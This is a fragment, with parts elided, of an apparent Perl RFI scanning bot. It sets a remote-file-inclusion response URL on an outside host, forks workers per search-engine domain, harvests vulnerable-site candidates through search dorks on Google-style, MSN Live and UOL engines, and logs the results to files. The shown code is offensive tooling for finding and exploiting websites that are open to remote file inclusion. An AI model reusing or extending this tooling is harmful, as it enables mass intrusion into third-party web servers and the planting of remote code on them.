...
my $id    = "http://reav1985.altervista.org/idv6.txt??";               #Your RFI Response
    ...
    foreach my $d(@domain) {
        ...
        if ($forks[$count] == 0) {
            for ($i=0;$i<=1000;$i+=100) {
                ...
                my $re = query1($gsup);open($lol,">>","azz.txt");print $lol "$re";close($lol);
    ...
    foreach my $d(@domain) {
        ...
        if ($forks[$count] == 0) {
            for ($i=1;$i<=501;$i+=10) {
                ...
                my $re = query($msup);open($ww,">>","azzm.txt");print $ww "$re";close($ww);
...
sub msn() {
    my $dork  = $_[0];
    my $name = $_[1];
    my $mtest = ("http://search.live.com/results.aspx?q=".key($dork)."&first=1&FORM=PERE");
    my $re = query($mtest);
    if ($re =~ /Non sono stati trovati risultati per/) {
        return @list;
    }
    else {
        for ($i = 1;$i <= 800;$i += 10) {
...
sub uol() {
    ...
    my $re = query($test1);
    if ($re =~ /não retornou nenhum resultado/) {
        return @list;
    }
    else {
        for($i = 0;$i <= 360;$i +=10) {
